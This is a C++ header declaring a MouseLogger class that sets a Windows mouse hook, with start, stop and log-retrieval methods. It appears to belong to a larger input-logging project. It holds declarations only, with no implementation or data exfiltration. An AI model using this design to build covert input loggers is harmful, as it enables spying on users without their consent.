#ifndef MOUSELOGGER_HPP_
#define MOUSELOGGER_HPP_

#include <Windows.h>
#include "ALogger.hpp"

class LoggerHandler;

class MouseLogger : public ALogger
{
public:
	MouseLogger();
	MouseLogger(LoggerHandler *handler);
	~MouseLogger();

	static LRESULT CALLBACK mouseEventProcCallback(int nCode, WPARAM wParam, LPARAM lParam);

	bool			start();
	void			stop() const;
	std::string		getLog();
	
	static LoggerHandler		*_handler;

private:
	HHOOK						_mouseHook;
	static const std::string	_flag;
};

#endif /* !MOUSELOGGER_HPP_ */

